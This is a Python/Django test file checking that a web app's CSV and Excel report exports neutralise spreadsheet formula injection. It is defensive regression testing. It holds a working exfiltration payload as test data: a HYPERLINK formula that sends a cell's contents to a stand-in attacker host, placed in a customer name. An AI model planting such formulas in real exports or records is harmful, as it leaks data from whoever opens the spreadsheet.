"""
Formula injection in exports.

A customer named =HYPERLINK("https://attacker/?"&B6,"Click") reached the
owner's Excel export as a live formula, because openpyxl stores any string
starting with "=" as one. See apps/core/export_safety.py.
"""

import io

import openpyxl
from django.test import SimpleTestCase, TestCase

from apps.core.export_safety import csv_safe, neutralise_workbook

PAYLOAD = '=HYPERLINK("https://attacker.example/?d="&B6,"Click")'


class CsvSafeTests(SimpleTestCase):
    def test_formula_triggers_are_neutralised(self):
        for bad in (PAYLOAD, "+1+1", "-2+3", "@SUM(A1)", "\t=1", "\r=1"):
            self.assertTrue(csv_safe(bad).startswith("'"), bad)

    def test_ordinary_values_are_untouched(self):
        for ok in ("Lekki Provisions Store", "-1450.00", "+2348010000000", "1,234.50", 42, None, ""):
            self.assertEqual(csv_safe(ok), ok)


class NeutraliseWorkbookTests(SimpleTestCase):
    def test_formula_cells_become_text_showing_exactly_what_was_typed(self):
        wb = openpyxl.Workbook()
        wb.active.append(["name", PAYLOAD])
        self.assertEqual(wb.active["B1"].data_type, "f")  # the hole
        neutralise_workbook(wb)
        buf = io.BytesIO(); wb.save(buf)
        cell = openpyxl.load_workbook(io.BytesIO(buf.getvalue())).active["B1"]
        self.assertEqual(cell.data_type, "s")
        self.assertEqual(cell.value, PAYLOAD)


class ReportExportFormulaTests(TestCase):
    def test_customer_details_excel_export_carries_no_formula(self):
        from apps.accounting.tests import _auth_client, _make_org, _make_user, _upgrade_to_business
        from apps.customers.models import Customer

        user = _make_user("xlsx_inject@example.com")
        org = _make_org(user, "XLSX Inject Org")
        _upgrade_to_business(org)
        Customer.objects.create(organisation=org, name=PAYLOAD, customer_type="retail")

        res = _auth_client(user, org).get("/api/v1/reports/customer-details/", {"format": "excel"})
        self.assertEqual(res.status_code, 200)
        ws = openpyxl.load_workbook(io.BytesIO(res.content)).active
        cells = [c for row in ws.iter_rows() for c in row]
        self.assertFalse([c.coordinate for c in cells if c.data_type == "f"])
        self.assertIn(PAYLOAD, [c.value for c in cells])
